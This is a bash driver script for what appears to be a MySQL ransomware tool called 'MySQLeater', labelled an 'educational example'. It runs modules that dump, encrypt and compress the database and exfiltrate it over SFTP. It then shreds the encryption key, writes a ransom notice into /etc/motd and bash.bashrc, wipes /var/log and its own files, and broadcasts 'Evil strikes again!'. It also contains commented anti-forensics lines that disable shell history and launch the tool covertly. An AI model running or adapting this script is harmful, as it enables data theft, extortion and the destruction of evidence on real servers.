#!/usr/bin/env bash

#RUN WITH SOURCE !!!!

#export HISTSIZE=0  && export HISTFILE=/dev/null #disables storage of commands used 

# List of packages to check
packages=("secure-delete" "python3" "python3-pip" "openssh-client" "openssh-server")

# List of pip dependencies to check
pip_dependencies=("mysql-connector-python" "pyAesCrypt" "cryptography" "paramiko" "requests")

# Function to check if Debian packages are installed

install_package() {
    
    if [[ -z $(dpkg -s "$1") ]]; then #if package does not exist - empty string
    
        apt-get install -y "$1"
    
        if [ $? -eq 0]; then
            
            echo "$1 installed successfully."   
        
        else 
            
            echo "Failed to install $1."
        
        fi  
    
    else
        
        echo "$1 is already installed."
    
    fi
}

# Function to install a pip dependency if not installed

install_pip_dependency() {
    
    if ! pip3 list --format=columns | grep -q "^$1 "; then 
        
        pip3 install "$1" --break-system-packages
        
        if [ $? -eq 0]; then
    
            echo "$1 installed successfully."   
    
        else 
    
            echo "Failed to install $1."
    
        fi    
    
    else
    
    echo "$1 is already installed."
    
    fi
}

# Start of program

echo "EDUCATIONAL EXAMPLE!"

apt-get update 
#DO NOT UPGRADE! consider upgrading only if you are having problems to run the scripts already

for package in "${packages[@]}"; do
    
    install_package "$package"

done

for pip_dependency in "${pip_dependencies[@]}"; do
    
    install_pip_dependency "$pip_dependency"

done

#Gives user execute permission for the Python scripts
chmod -R 755 ./py_scripts

cd ./py_scripts

# Creating directory to save outputs
mkdir outputs

#Python scripts start here

echo "Starting SQL to CSV Module ..."

python3 sql2csv.py > ./outputs/out_sql2csv.txt 

echo "The module SQL to CSV is finished!"

echo "Starting encryption module ..."

python3 cryptV2.py > ./outputs/out_cryptV2.txt

echo "The encryption module is finished!"

echo "Starting compression module ..."

cp ./database_encryption_key.txt ./db_backup/database_encryption_key.txt

python3 zipper.py > ./outputs/out_zipper.txt

echo "The compression module is finished!"

echo "Starting exfiltration module (SFTP) ..."

python3 sftp.py > ./outputs/out_sftp.txt

echo "Exfiltration module is finished!"

# covert: nohup python3 main.py > /dev/null 2>&1 &

# sleep 10

#To apply changes the mysql service should be restarted with the comand:

systemctl restart mysql 

#removes keys

srm -z -v -f ./db_backup/database_encryption_key.txt ./db_backup/datadirpath.txt
#avoid using the fast option for real applications of the srm package
#copies encrypted csv files and folder structure created using python
cp -r ./db_backup /decrypt_me

touch /decrypt_me/replace_me_with_key_file

cd .. #go back to project folder

cp ./decrypt.py /decrypt_me/decrypt.py 

CUR_DIR=$(pwd)

echo $CUR_DIR

cat special_motd >> /etc/motd

date >> /etc/motd

echo "cat /etc/motd" >> /etc/bash.bashrc

#Clean up of all files used and generated and server logs
# not very effective for SSD drives
cd ..
srm -r -v -f -z ./MySQLeater  
srm -r -v -f -z /var/log

wall -n "Evil strikes again! Check your motd file (cat /etc/motd) for instructions of how to get your data back."


